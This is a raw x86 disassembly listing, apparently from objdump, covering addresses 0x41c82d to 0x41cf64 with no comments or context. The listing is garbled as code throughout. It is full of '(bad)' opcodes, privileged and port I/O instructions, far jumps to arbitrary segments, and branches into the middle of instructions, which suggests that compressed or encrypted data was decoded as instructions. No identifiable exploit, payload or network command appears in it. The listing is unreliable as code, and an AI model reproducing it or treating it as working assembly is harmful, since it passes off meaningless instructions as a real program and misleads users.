  41c82d:	mov    al,0xbe
  41c82f:	push   ebx
  41c830:	mov    BYTE PTR [ebx],dh
  41c832:	or     DWORD PTR [ebx-0x29],0xfa6a58b
  41c839:	cs (bad) 
  41c83b:	repz cld 
  41c83d:	(bad)  [edi+edx*4]
  41c840:	cmp    dh,ah
  41c842:	xor    ah,bl
  41c844:	mov    bh,0x58
  41c846:	lock outs dx,BYTE PTR ds:[esi]
  41c848:	inc    ebp
  41c849:	pop    ds
  41c84a:	inc    esi
  41c84b:	outs   dx,DWORD PTR ds:[esi]
  41c84c:	lods   al,BYTE PTR ds:[esi]
  41c84d:	mov    ebp,0x90ca8824
  41c852:	jmp    0x41c81f
  41c854:	inc    ebp
  41c855:	fadd   QWORD PTR [eax+ecx*4+0x38]
  41c859:	jl     0x41c8d9
  41c85b:	jae    0x41c813
  41c85d:	mov    ebx,0xfad4a6ed
  41c862:	test   BYTE PTR [ebx],dh
  41c864:	sbb    BYTE PTR [ecx+ebx*1],ch
  41c867:	pop    edi
  41c868:	cmp    eax,0x992cdb3d
  41c86d:	scas   al,BYTE PTR es:[edi]
  41c86e:	sti    
  41c86f:	adc    ch,0xc8
  41c872:	cmp    edi,DWORD PTR [ecx]
  41c874:	mov    edx,0x717a2b4
  41c879:	mov    eax,0x4768d264
  41c87e:	ficomp WORD PTR [ebp+0x22]
  41c881:	sar    al,cl
  41c883:	mov    ah,0xc
  41c885:	fs fucomi st,st(2)
  41c888:	mov    bh,bh
  41c88a:	es push ss
  41c88c:	inc    esp
  41c88d:	mov    WORD PTR [ecx],fs
  41c88f:	sbb    al,0xd3
  41c891:	lods   al,BYTE PTR ds:[esi]
  41c892:	je     0x41c820
  41c894:	addr16 mov ah,0xf7
  41c897:	pop    edx
  41c898:	inc    edi
  41c899:	inc    esi
  41c89a:	test   DWORD PTR [eax-0x7],edi
  41c89d:	jb     0x41c89f
  41c89f:	imul   edx,DWORD PTR [edx+0x23711a72],0x7c
  41c8a6:	outs   dx,DWORD PTR ds:[esi]
  41c8a7:	cmp    BYTE PTR [edi+0x57c3ed6e],0x4f
  41c8ae:	jns    0x41c891
  41c8b0:	push   eax
  41c8b1:	and    DWORD PTR [ecx+ebx*1],0x43
  41c8b5:	aaa    
  41c8b6:	sub    esi,0xa43b99e0
  41c8bc:	sub    ebp,DWORD PTR [edx]
  41c8be:	adc    BYTE PTR [edi-0x53],dh
  41c8c1:	xor    al,0x6e
  41c8c3:	stc    
  41c8c4:	xchg   BYTE PTR [edx-0x1bd9eb80],ch
  41c8ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8cb:	push   ecx
  41c8cc:	loop   0x41c91f
  41c8ce:	mov    edi,0x137320ba
  41c8d3:	or     esp,edi
  41c8d5:	(bad)  
  41c8d6:	pop    esp
  41c8d7:	lods   al,BYTE PTR ds:[esi]
  41c8d8:	pop    ebx
  41c8d9:	or     eax,0x43a04cd3
  41c8de:	ja     0x41c86e
  41c8e0:	(bad)  
  41c8e2:	sbb    ah,al
  41c8e4:	push   esi
  41c8e5:	jmp    0x3920:0xccea2432
  41c8ec:	shl    DWORD PTR [edx+0x26],1
  41c8ef:	mov    esi,0xe0b4a5e4
  41c8f4:	(bad)  
  41c8f5:	cdq    
  41c8f6:	mov    DWORD PTR [esi],esp
  41c8f8:	jb     0x41c888
  41c8fa:	data16 mov cl,0xdc
  41c8fd:	cmp    BYTE PTR [ebx-0x17808271],0x17
  41c904:	jg     0x41c930
  41c906:	dec    edx
  41c907:	loope  0x41c8b8
  41c909:	mov    dl,0xf
  41c90b:	mov    dl,0x6c
  41c90d:	fwait
  41c90e:	stos   BYTE PTR es:[edi],al
  41c90f:	(bad)  
  41c910:	sbb    bh,bh
  41c912:	pushf  
  41c913:	fadd   DWORD PTR [edi-0x953d35a]
  41c919:	ret    0x2870
  41c91c:	repz xchg ebp,eax
  41c91e:	push   eax
  41c91f:	repnz xchg edx,eax
  41c921:	or     eax,0x346e6c74
  41c926:	jmp    0x41c949
  41c928:	jns    0x41c905
  41c92a:	pop    edi
  41c92b:	inc    ebp
  41c92c:	imul   ecx,edx,0x38
  41c92f:	jmp    0x41c937
  41c931:	jmp    0x41c95b
  41c933:	ret    0x31c4
  41c936:	mov    ebx,0xf6feec16
  41c93b:	icebp  
  41c93c:	dec    eax
  41c93d:	repnz ins BYTE PTR es:[edi],dx
  41c93f:	mov    WORD PTR [ebp-0x6a899cca],es
  41c945:	sub    al,0x7f
  41c947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c948:	or     BYTE PTR [edx+0x5d60e22e],ah
  41c94e:	fistp  QWORD PTR [eax-0x5]
  41c951:	add    DWORD PTR [eax+0x8],esp
  41c954:	neg    DWORD PTR [ebx-0x34]
  41c957:	repz dec eax
  41c959:	jno    0x41c956
  41c95b:	nop
  41c95c:	pop    edx
  41c95d:	and    DWORD PTR [edi-0x5e095180],edi
  41c963:	pop    ebx
  41c964:	ins    BYTE PTR es:[edi],dx
  41c965:	mov    cl,0x46
  41c967:	test   DWORD PTR ds:0xbac7351a,ebx
  41c96d:	cmp    ebp,DWORD PTR [ebx+ebx*1]
  41c970:	xor    ch,0x6d
  41c973:	inc    ebp
  41c974:	loope  0x41c9ee
  41c976:	xor    al,0x51
  41c978:	imul   eax,eax,0x63
  41c97b:	dec    esi
  41c97c:	(bad)
  41c97f:	scas   eax,DWORD PTR es:[edi]
  41c980:	sbb    al,0xd7
  41c982:	push   edi
  41c983:	outs   dx,BYTE PTR ds:[esi]
  41c984:	xchg   esp,eax
  41c985:	call   0xad6:0x5acf9d2a
  41c98c:	adc    al,BYTE PTR [edx-0x6b6c11ad]
  41c992:	cld    
  41c993:	dec    esi
  41c994:	xor    al,BYTE PTR [ebx-0x3a]
  41c997:	add    al,0xe5
  41c999:	inc    edx
  41c99a:	jae    0x41c927
  41c99c:	das    
  41c99d:	not    DWORD PTR [esi-0x34e89d55]
  41c9a3:	fisubr WORD PTR [ebp+0x7f]
  41c9a6:	mov    ds:0xeaa82fd0,eax
  41c9ab:	aam    0xfa
  41c9ad:	mov    WORD PTR [esi],gs
  41c9af:	push   edx
  41c9b0:	fwait
  41c9b1:	jg     0x41c950
  41c9b3:	in     eax,dx
  41c9b4:	push   0xfe7b5c4d
  41c9b9:	jmp    0x41c951
  41c9bb:	and    cl,BYTE PTR [ecx]
  41c9bd:	fist   WORD PTR [ebx+eax*8-0x77]
  41c9c1:	or     eax,0x785c0580
  41c9c6:	mov    eax,0x5d96499b
  41c9cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9cc:	in     eax,dx
  41c9cd:	inc    esp
  41c9ce:	mov    eax,0x9c873ea8
  41c9d3:	stc    
  41c9d4:	stos   BYTE PTR es:[edi],al
  41c9d5:	in     eax,dx
  41c9d6:	push   0x17
  41c9d8:	out    0x2c,eax
  41c9da:	inc    edi
  41c9db:	jne    0x41c98e
  41c9dd:	cmp    DWORD PTR [edx],esi
  41c9df:	inc    ebx
  41c9e0:	adc    eax,0x8dcc1571
  41c9e5:	(bad)  
  41c9e6:	adc    cl,BYTE PTR [eax+0xcb3210b]
  41c9ec:	inc    ebp
  41c9ed:	test   eax,0x80b0297e
  41c9f2:	stos   DWORD PTR es:[edi],eax
  41c9f3:	ss mov ah,0x2a
  41c9f6:	push   esp
  41c9f7:	sub    ebp,DWORD PTR [esi+0x6c]
  41c9fa:	and    dh,BYTE PTR [ecx+0x29]
  41c9fd:	mov    esp,0x2b67c100
  41ca02:	inc    esp
  41ca03:	repz xchg edx,eax
  41ca05:	les    esi,FWORD PTR ds:0xee242b91
  41ca0b:	cmp    edx,DWORD PTR [edx+0x1173e8d5]
  41ca11:	in     al,dx
  41ca12:	(bad)  
  41ca13:	arpl   WORD PTR [ecx-0x65d0c10],bx
  41ca19:	sub    bh,BYTE PTR [eax+0x31]
  41ca1c:	and    ebx,DWORD PTR [ebp+0x34af825c]
  41ca22:	mov    ebx,0xa6a8f4aa
  41ca27:	aas    
  41ca28:	test   eax,0x3d43840a
  41ca2d:	loope  0x41ca76
  41ca2f:	loopne 0x41ca25
  41ca31:	xchg   BYTE PTR [edi+eiz*1-0x73],bl
  41ca35:	out    dx,al
  41ca36:	nop
  41ca37:	or     BYTE PTR [esi],ch
  41ca39:	cmp    BYTE PTR [edx-0x31],al
  41ca3c:	enter  0x22fd,0x2c
  41ca40:	outs   dx,BYTE PTR ds:[esi]
  41ca41:	adc    eax,0x7c837fd6
  41ca46:	outs   dx,DWORD PTR ds:[esi]
  41ca47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca48:	jnp    0x41c9cc
  41ca4a:	jns    0x41ca92
  41ca4c:	mov    ah,0xb1
  41ca4e:	mov    dl,BYTE PTR [edx-0x78]
  41ca51:	or     al,0x32
  41ca53:	mov    ebx,0x6c999287
  41ca58:	fist   DWORD PTR [ebx-0x5d]
  41ca5b:	inc    edi
  41ca5c:	std    
  41ca5d:	jno    0x41cad1
  41ca5f:	inc    ebp
  41ca60:	sub    eax,0x12dcd906
  41ca65:	retf   0xc9c3
  41ca68:	mov    ecx,0xe1839acb
  41ca6d:	in     al,dx
  41ca6e:	and    eax,0xb6001498
  41ca73:	xchg   edx,eax
  41ca74:	retf   
  41ca75:	pushf  
  41ca76:	ins    DWORD PTR es:[edi],dx
  41ca77:	push   0xffffffca
  41ca79:	loopne 0x41ca43
  41ca7b:	jo     0x41ca3c
  41ca7d:	push   ss
  41ca7e:	in     al,0xc6
  41ca80:	jge    0x41cad4
  41ca82:	pop    ebp
  41ca83:	xchg   edi,eax
  41ca84:	mov    al,0x9e
  41ca86:	dec    esi
  41ca87:	and    bh,BYTE PTR ds:0x2bf5a59a
  41ca8d:	mov    ecx,0x9373847e
  41ca92:	sub    BYTE PTR [ecx+ebx*8],cl
  41ca95:	rol    BYTE PTR [eax-0x14cb792],0x17
  41ca9c:	cs jg  0x41ca95
  41ca9f:	ins    DWORD PTR es:[edi],dx
  41caa0:	stos   BYTE PTR es:[edi],al
  41caa1:	cmp    edx,DWORD PTR [ebp-0x37]
  41caa4:	pop    edx
  41caa5:	inc    ebp
  41caa6:	arpl   WORD PTR [esi+0x43],di
  41caa9:	push   eax
  41caaa:	xor    ah,BYTE PTR [ebp-0x755b10c1]
  41cab0:	pop    ss
  41cab1:	pop    edi
  41cab2:	(bad)  
  41cab3:	fcom   QWORD PTR [esi+0x56]
  41cab6:	push   0x8afa4b71
  41cabb:	gs jecxz 0x41cb35
  41cabe:	cli    
  41cabf:	hlt    
  41cac0:	mov    edx,0x36e81c7d
  41cac5:	push   ss
  41cac6:	cmc    
  41cac7:	dec    esi
  41cac8:	pusha  
  41cac9:	fisubr WORD PTR [eax]
  41cacb:	inc    esi
  41cacc:	in     eax,0xc
  41cace:	mov    ebx,0x561e8a5d
  41cad3:	sub    DWORD PTR [eax],esi
  41cad5:	shl    BYTE PTR [ebx+0x24ded803],0x55
  41cadc:	inc    esi
  41cadd:	loope  0x41cb09
  41cadf:	or     eax,0xd5aea0f3
  41cae4:	cmp    ecx,DWORD PTR [ebx+0x6]
  41cae7:	cld    
  41cae8:	hlt    
  41cae9:	cmp    esi,edi
  41caeb:	int    0x5
  41caed:	fs (bad) 
  41caef:	jae    0x41cb24
  41caf1:	outs   dx,DWORD PTR ds:[esi]
  41caf2:	add    ebp,ebx
  41caf4:	arpl   WORD PTR [ebx],dx
  41caf6:	lods   al,BYTE PTR ds:[esi]
  41caf7:	out    0x55,al
  41caf9:	popa   
  41cafa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cafb:	push   ds
  41cafc:	test   DWORD PTR [esp+eax*2-0x41],esi
  41cb00:	leave  
  41cb01:	xchg   edx,eax
  41cb02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb03:	fidiv  WORD PTR [edi]
  41cb05:	jae    0x41ca88
  41cb07:	xchg   ebx,eax
  41cb08:	jns    0x41cb2c
  41cb0a:	ror    DWORD PTR [edi+0xe],cl
  41cb0d:	xor    bh,0x53
  41cb10:	neg    DWORD PTR [ebx]
  41cb12:	cld    
  41cb13:	pop    edi
  41cb14:	sbb    al,dh
  41cb16:	dec    edx
  41cb17:	and    eax,0x9d0ce44a
  41cb1c:	inc    ebp
  41cb1d:	jb     0x41caa2
  41cb1f:	cmp    BYTE PTR [edx+0x263ba0b],dh
  41cb25:	sub    al,0xdd
  41cb27:	icebp  
  41cb28:	mov    al,ds:0x2a86eb35
  41cb2d:	lods   al,BYTE PTR ds:[esi]
  41cb2e:	xchg   ebp,eax
  41cb2f:	sub    DWORD PTR ds:0x95e5154f,0xffffffba
  41cb36:	mov    ebx,0x11e3ae67
  41cb3b:	fwait
  41cb3c:	add    DWORD PTR [edi+0xf],ebp
  41cb3f:	inc    esi
  41cb40:	ins    DWORD PTR es:[edi],dx
  41cb41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cb42:	mov    edx,0x85ac0dcf
  41cb47:	xchg   edx,eax
  41cb48:	dec    esi
  41cb49:	clc    
  41cb4a:	adc    eax,0x8120c4a3
  41cb4f:	rol    DWORD PTR [ebx-0x7c13e298],1
  41cb55:	and    esp,DWORD PTR [eax+0x7db7cf54]
  41cb5b:	(bad)  
  41cb5c:	stc    
  41cb5d:	push   es
  41cb5e:	xchg   edi,eax
  41cb5f:	jne    0x41cb9c
  41cb61:	je     0x41cbba
  41cb63:	lods   eax,DWORD PTR ss:[esi]
  41cb65:	outs   dx,BYTE PTR ds:[esi]
  41cb66:	mov    dh,0x83
  41cb68:	es loop 0x41cb9d
  41cb6b:	or     edx,DWORD PTR [edi-0x4]
  41cb6e:	mov    dl,BYTE PTR [ebp-0x77]
  41cb71:	sahf   
  41cb72:	pop    eax
  41cb73:	sbb    ch,al
  41cb75:	or     ebx,eax
  41cb77:	cmc    
  41cb78:	lods   eax,DWORD PTR ds:[esi]
  41cb79:	repz int3 
  41cb7b:	push   ebx
  41cb7c:	cli    
  41cb7d:	dec    ecx
  41cb7e:	sbb    dh,BYTE PTR [ecx-0x46ac514]
  41cb84:	cmp    cl,BYTE PTR [edi*1-0x312b44ed]
  41cb8b:	pop    edi
  41cb8c:	fwait
  41cb8d:	or     al,0x33
  41cb8f:	inc    ecx
  41cb90:	xchg   ebp,eax
  41cb91:	std    
  41cb92:	mov    ah,0x94
  41cb94:	jb     0x41cb94
  41cb96:	or     BYTE PTR [ebx-0x40],cl
  41cb99:	loop   0x41cbb6
  41cb9b:	test   al,0x4e
  41cb9d:	aaa    
  41cb9e:	into   
  41cb9f:	fistp  WORD PTR [ebx]
  41cba1:	call   0xd426:0x5242db76
  41cba8:	mov    bh,0x91
  41cbaa:	inc    DWORD PTR [eax]
  41cbac:	test   eax,0xe834c820
  41cbb1:	lahf   
  41cbb2:	icebp  
  41cbb3:	inc    ebp
  41cbb4:	xchg   ebx,eax
  41cbb5:	in     eax,0xf3
  41cbb7:	mov    ebx,0x6f72f15c
  41cbbc:	or     cl,BYTE PTR [ebp+0x28fad18]
  41cbc2:	mov    ds:0x53310a58,al
  41cbc7:	repnz or al,0xd2
  41cbca:	adc    al,0xae
  41cbcc:	test   eax,0x47dfb320
  41cbd1:	lea    eax,[ebp-0x10]
  41cbd4:	or     DWORD PTR [ecx],edx
  41cbd6:	loop   0x41cb6f
  41cbd8:	mov    cl,0xf
  41cbda:	xchg   ebx,eax
  41cbdb:	or     esi,DWORD PTR [ebp+0x43]
  41cbde:	mov    eax,ds:0x53f7492c
  41cbe3:	xor    BYTE PTR [eax-0x2b],bh
  41cbe6:	aad    0x53
  41cbe8:	in     eax,dx
  41cbe9:	sbb    ecx,eax
  41cbeb:	stos   BYTE PTR es:[edi],al
  41cbec:	ret    
  41cbed:	imul   esi,edx,0x74
  41cbf0:	jns    0x41cc0e
  41cbf2:	imul   ebx,esp,0xffffffaa
  41cbf5:	out    0xe0,eax
  41cbf7:	sub    al,0x40
  41cbf9:	jmp    0x633c1a42
  41cbfe:	cwde   
  41cbff:	jp     0x41cbdd
  41cc01:	add    DWORD PTR [edi-0x43],0xffffffdd
  41cc05:	test   DWORD PTR [ebx*1+0x50a7f67d],eax
  41cc0c:	push   ecx
  41cc0d:	int3   
  41cc0e:	out    dx,al
  41cc0f:	bound  ecx,QWORD PTR [ebx-0x80]
  41cc12:	mov    BYTE PTR [ebp+0x5a8d8568],0x97
  41cc19:	adc    edx,DWORD PTR [ebx+eiz*4]
  41cc1c:	lock stc 
  41cc1e:	jae    0x41cbc7
  41cc20:	stc    
  41cc21:	push   0x1399ad5a
  41cc26:	jae    0x41cbcb
  41cc28:	arpl   WORD PTR [ecx+0x36411a9c],ax
  41cc2e:	repz retf 0x3a7a
  41cc32:	xchg   edi,eax
  41cc33:	out    dx,eax
  41cc34:	outs   dx,DWORD PTR ds:[esi]
  41cc35:	mov    dh,0xe0
  41cc37:	push   edx
  41cc38:	aad    0xe4
  41cc3a:	push   esp
  41cc3b:	cmc    
  41cc3c:	icebp  
  41cc3d:	add    ch,BYTE PTR [esi+esi*2]
  41cc40:	jge    0x41cbd2
  41cc42:	push   esp
  41cc43:	push   edi
  41cc44:	dec    ebp
  41cc45:	sti    
  41cc46:	pop    ss
  41cc47:	(bad)  
  41cc48:	adc    eax,0x35acad58
  41cc4d:	adc    DWORD PTR [ebp-0x4596b414],eax
  41cc53:	push   cs
  41cc54:	add    BYTE PTR [esp+ebp*4-0x77],al
  41cc58:	pop    es
  41cc59:	mov    bh,0xc6
  41cc5b:	mov    eax,ds:0xd57e3421
  41cc60:	inc    ebp
  41cc61:	mov    eax,0x1d327acd
  41cc66:	cmp    BYTE PTR [edi],cl
  41cc68:	and    al,0x99
  41cc6a:	and    bl,BYTE PTR [edx+0x6a5d3a2a]
  41cc70:	jl     0x41cc5f
  41cc72:	jbe    0x41cc51
  41cc74:	or     BYTE PTR [edx-0x47],al
  41cc77:	rcl    BYTE PTR [ecx+0x6efcce24],0xde
  41cc7e:	lods   eax,DWORD PTR ds:[esi]
  41cc7f:	sti    
  41cc80:	xchg   ebx,eax
  41cc81:	stc    
  41cc82:	inc    eax
  41cc83:	push   eax
  41cc84:	inc    ax
  41cc86:	jno    0x41cc0a
  41cc88:	outs   dx,BYTE PTR ds:[esi]
  41cc89:	fldenv ds:0xc4e02af7
  41cc8f:	adc    edi,ebp
  41cc91:	inc    edi
  41cc92:	repz sbb edx,DWORD PTR [ebx-0x7ef1a75f]
  41cc99:	adc    al,0x38
  41cc9b:	push   ss
  41cc9c:	(bad)
  41cca0:	mov    edx,0x3ab13d84
  41cca5:	lods   al,BYTE PTR ds:[esi]
  41cca6:	mov    bh,0xa6
  41cca8:	test   dl,0x70
  41ccab:	mov    ah,0x3
  41ccad:	adc    al,0xd1
  41ccaf:	stos   DWORD PTR es:[edi],eax
  41ccb0:	sub    bl,0xa8
  41ccb3:	out    0xc7,al
  41ccb5:	lods   eax,DWORD PTR ds:[esi]
  41ccb6:	mov    al,ds:0x1c63e640
  41ccbb:	xchg   ebp,eax
  41ccbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccbd:	cwde   
  41ccbe:	mov    eax,0xbe9fe5e9
  41ccc3:	fsubr  st,st(0)
  41ccc5:	add    BYTE PTR [ebx],0x5f
  41ccc8:	out    dx,al
  41ccc9:	xabort 0x33
  41cccc:	pusha  
  41cccd:	leave  
  41ccce:	xchg   dl,al
  41ccd0:	daa    
  41ccd1:	fsubr  st,st(1)
  41ccd3:	add    edi,DWORD PTR cs:[ebx+0x5c]
  41ccd7:	push   es
  41ccd8:	mov    bh,0x3f
  41ccda:	mov    ebp,0x51fbc32b
  41ccdf:	inc    edx
  41cce0:	daa    
  41cce1:	xor    DWORD PTR [ecx+0x7f66d0dd],edx
  41cce7:	xchg   esp,eax
  41cce8:	cs ins BYTE PTR es:[edi],dx
  41ccea:	pop    ebp
  41cceb:	mov    esp,DWORD PTR ds:0x25c2a0a2
  41ccf1:	sub    dl,dl
  41ccf3:	or     bl,0x76
  41ccf6:	and    DWORD PTR [esi],eax
  41ccf8:	inc    ecx
  41ccf9:	add    dl,ah
  41ccfb:	bound  edi,QWORD PTR [ebp-0x24]
  41ccfe:	sub    DWORD PTR [ebp-0x469522d4],edi
  41cd04:	xchg   edx,eax
  41cd05:	add    dh,bh
  41cd07:	sub    edi,esp
  41cd09:	pusha  
  41cd0a:	iret   
  41cd0b:	jmp    0x53cbac7b
  41cd10:	add    bl,BYTE PTR ds:0x29ce94f3
  41cd16:	daa    
  41cd17:	or     BYTE PTR [ecx-0xd],bl
  41cd1a:	sub    ebx,0x44ac1aef
  41cd20:	xlat   BYTE PTR ds:[ebx]
  41cd21:	dec    ebp
  41cd22:	mov    al,ds:0xb3266ecd
  41cd27:	push   cs
  41cd28:	xor    al,0xe3
  41cd2a:	ret    0xf4d4
  41cd2d:	mov    dh,0x95
  41cd2f:	push   ecx
  41cd30:	in     al,dx
  41cd31:	out    0x28,eax
  41cd33:	sbb    ebx,DWORD PTR [edi+0x2d]
  41cd36:	sbb    al,0x89
  41cd38:	push   ss
  41cd39:	pop    edx
  41cd3a:	aam    0xe2
  41cd3c:	and    al,BYTE PTR [edi-0x38dbda27]
  41cd42:	sar    dh,cl
  41cd44:	pushf  
  41cd45:	dec    edi
  41cd46:	adc    ebp,DWORD PTR cs:[ebp-0x6a96d01b]
  41cd4d:	in     al,0x37
  41cd4f:	or     eax,0xf899e17f
  41cd54:	cmp    eax,0xc87212f6
  41cd59:	mov    bl,BYTE PTR [edi+0x62]
  41cd5c:	lock mov BYTE PTR [edi-0x29da1a1f],al
  41cd63:	out    dx,al
  41cd64:	mov    bh,0x16
  41cd66:	mov    edi,0x9e0376a3
  41cd6b:	jecxz  0x41cd51
  41cd6d:	(bad)  
  41cd6e:	mov    ds:0x9cc20c,eax
  41cd73:	arpl   WORD PTR [edx-0x28],bx
  41cd76:	retf   
  41cd77:	cld    
  41cd78:	push   ecx
  41cd79:	test   BYTE PTR [esi+0x2c],ah
  41cd7c:	pop    ecx
  41cd7d:	sub    ah,BYTE PTR [ebx-0x2c]
  41cd80:	pop    ds
  41cd81:	push   ebx
  41cd82:	xchg   ecx,eax
  41cd83:	inc    esi
  41cd84:	dec    edx
  41cd85:	inc    ebp
  41cd86:	mov    esp,0x19d31e6c
  41cd8b:	jle    0x41cd97
  41cd8d:	mov    al,ds:0x6b9181d0
  41cd92:	ret    0xc106
  41cd95:	or     esp,DWORD PTR [esi+0x7e62901d]
  41cd9b:	mov    DWORD PTR [ecx-0x77],0xb58e0b15
  41cda2:	mov    bl,0xc
  41cda4:	jmp    0x74be:0x55a114c8
  41cdab:	sbb    ah,dl
  41cdad:	mov    cl,0x1c
  41cdaf:	lods   eax,DWORD PTR ds:[esi]
  41cdb0:	cdq    
  41cdb1:	(bad)  
  41cdb2:	jp     0x41cd40
  41cdb4:	sbb    al,0xc
  41cdb6:	xchg   ecx,eax
  41cdb7:	add    BYTE PTR [edx-0x55],dl
  41cdba:	and    BYTE PTR [edx-0x7a4c8ace],ch
  41cdc0:	pop    ebp
  41cdc1:	icebp  
  41cdc2:	mov    esi,0xe5fb8342
  41cdc7:	jnp    0x41cda9
  41cdc9:	inc    ecx
  41cdca:	mov    ds:0xc18f09f9,eax
  41cdcf:	mov    bl,al
  41cdd1:	sbb    DWORD PTR [ecx+0x3c],esp
  41cdd4:	xchg   edx,eax
  41cdd5:	outs   dx,DWORD PTR ds:[esi]
  41cdd6:	mov    ecx,0x5cba57ce
  41cddb:	inc    ebx
  41cddc:	dec    esi
  41cddd:	pop    eax
  41cdde:	popa   
  41cddf:	push   esi
  41cde0:	pop    ebp
  41cde1:	sbb    BYTE PTR [eax],ch
  41cde3:	loop   0x41cd9e
  41cde5:	in     al,dx
  41cde6:	mov    ecx,0x64ea2d55
  41cdeb:	jbe    0x41ce14
  41cded:	rcr    BYTE PTR [eax],1
  41cdef:	push   0xffffff84
  41cdf1:	in     eax,0x52
  41cdf3:	or     eax,0xc245687a
  41cdf8:	stos   BYTE PTR es:[edi],al
  41cdf9:	adc    BYTE PTR [esi+0x4e],ch
  41cdfc:	gs jbe 0x41ce70
  41cdff:	push   ebx
  41ce00:	mov    WORD PTR [edi-0x38],ss
  41ce03:	mov    eax,0x86f2317f
  41ce08:	jnp    0x41cdc1
  41ce0a:	push   edx
  41ce0b:	aad    0xec
  41ce0d:	popa   
  41ce0e:	hlt    
  41ce0f:	aam    0x8c
  41ce11:	outs   dx,BYTE PTR ds:[esi]
  41ce12:	xor    DWORD PTR [ecx-0x4deb31da],edi
  41ce18:	cmp    eax,0xe25c1c0d
  41ce1d:	ja     0x41ce89
  41ce1f:	pop    esp
  41ce20:	ins    BYTE PTR es:[edi],dx
  41ce21:	jno    0x41cdcc
  41ce23:	iret   
  41ce24:	mov    ch,0x92
  41ce26:	mov    bh,0x37
  41ce28:	xor    BYTE PTR [ebx-0x280fc90b],dl
  41ce2e:	test   eax,0x2322c7fc
  41ce33:	sub    BYTE PTR [edx+0x2e],cl
  41ce36:	xchg   edx,eax
  41ce37:	and    eax,0x350016f2
  41ce3c:	sub    DWORD PTR [edi],0x3e
  41ce3f:	mov    dl,BYTE PTR [ebp+0x6e9a757d]
  41ce45:	pop    ebx
  41ce46:	mov    edx,0xf8d8d92c
  41ce4b:	jl     0x41ce9c
  41ce4d:	xor    al,0xa8
  41ce4f:	cwde   
  41ce50:	out    0x42,eax
  41ce52:	aam    0xce
  41ce54:	shr    BYTE PTR [ecx-0x20874de1],0xad
  41ce5b:	and    DWORD PTR [edx-0x4f],ebx
  41ce5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce5f:	loopne 0x41ce44
  41ce61:	cmp    ecx,eax
  41ce63:	xchg   ecx,eax
  41ce64:	push   esp
  41ce65:	mov    dl,0x1d
  41ce67:	mov    ch,0x4
  41ce69:	hlt    
  41ce6a:	mov    dl,BYTE PTR [esi-0xb77d17a]
  41ce70:	jnp    0x41cebe
  41ce72:	mov    ch,0x27
  41ce74:	mov    dh,0x99
  41ce76:	test   al,0x8d
  41ce78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce79:	scas   al,BYTE PTR es:[edi]
  41ce7a:	ins    DWORD PTR es:[edi],dx
  41ce7b:	fsubr  QWORD PTR [ebx+0x14]
  41ce7e:	fs mov cl,0xa8
  41ce81:	adc    ah,bh
  41ce83:	into   
  41ce84:	inc    ecx
  41ce85:	addr16 jp 0x41cf02
  41ce88:	mov    cl,0x50
  41ce8a:	jo     0x41cea8
  41ce8c:	jns    0x41ce5b
  41ce8e:	shl    DWORD PTR [esi+0x1c25ac16],1
  41ce94:	xchg   edi,eax
  41ce95:	lea    esp,[ebp+0x3f4caef1]
  41ce9b:	sub    eax,0x275c3c50
  41cea0:	(bad)  
  41cea1:	inc    ebx
  41cea2:	sub    BYTE PTR [eax],bh
  41cea4:	jb     0x41ce27
  41cea6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cea7:	mov    esp,0x4134cc20
  41ceac:	test   BYTE PTR [edx],0xf4
  41ceaf:	jmp    0x9c80:0xfc1e7cd
  41ceb6:	dec    edi
  41ceb7:	popf   
  41ceb8:	jae    0x41cec1
  41ceba:	adc    BYTE PTR [ebp+0x69],ch
  41cebd:	mov    edi,DWORD PTR [esi-0x7d0a9b53]
  41cec3:	call   0xefdb:0x67cd6fa7
  41ceca:	scas   al,BYTE PTR es:[edi]
  41cecb:	sbb    dl,BYTE PTR [ebp-0x61]
  41cece:	and    DWORD PTR [edi+0x6f8ca699],esp
  41ced4:	(bad)  
  41ced5:	in     al,0x4b
  41ced7:	dec    ebx
  41ced8:	jecxz  0x41cf20
  41ceda:	xor    edx,DWORD PTR [bp+si]
  41cedd:	rcl    DWORD PTR [ebp-0xa9643ae],0x36
  41cee4:	outs   dx,BYTE PTR ds:[esi]
  41cee5:	cld    
  41cee6:	xor    ah,ah
  41cee8:	aas    
  41cee9:	and    BYTE PTR [ecx-0x63],0xb9
  41ceed:	add    DWORD PTR [esi+0x69],esp
  41cef0:	dec    esp
  41cef1:	jge    0x41cf61
  41cef3:	stos   BYTE PTR es:[edi],al
  41cef4:	sar    BYTE PTR [edx-0x3fc14bfd],1
  41cefa:	mov    edx,0x91163be5
  41ceff:	shr    DWORD PTR [eax+edi*4-0x66b70a13],0xea
  41cf07:	pop    ss
  41cf08:	icebp  
  41cf09:	inc    ebx
  41cf0a:	mov    ebp,0xa3d7ec1c
  41cf0f:	out    0xf9,al
  41cf11:	sti    
  41cf12:	xchg   BYTE PTR ds:0x52a80ec,dh
  41cf18:	js     0x41cf52
  41cf1a:	add    al,0xab
  41cf1c:	mov    esp,0x1cddc532
  41cf21:	jmp    0xecac:0xe16457
  41cf28:	(bad)  
  41cf29:	push   esi
  41cf2a:	ja     0x41cf22
  41cf2c:	out    dx,al
  41cf2d:	ins    DWORD PTR es:[edi],dx
  41cf2e:	call   0xedf7ce6c
  41cf33:	ret    0x1303
  41cf36:	inc    edi
  41cf37:	jbe    0x41cf3a
  41cf39:	stc    
  41cf3a:	js     0x41cee8
  41cf3c:	dec    eax
  41cf3d:	(bad)  
  41cf3f:	retf   0xfac
  41cf42:	imul   eax,DWORD PTR [eax-0x6081c8db],0xffffffb0
  41cf49:	pop    ebp
  41cf4a:	xor    BYTE PTR [ebp-0x74],0xd
  41cf4e:	and    DWORD PTR [ebx],esp
  41cf50:	jo     0x41cf14
  41cf52:	xchg   esp,eax
  41cf53:	fwait
  41cf54:	imul   DWORD PTR [ecx+0x25cd73d5]
  41cf5a:	mov    eax,ds:0xdd467c1e
  41cf5f:	cmp    eax,0x3c3f65aa
  41cf64:	ret    
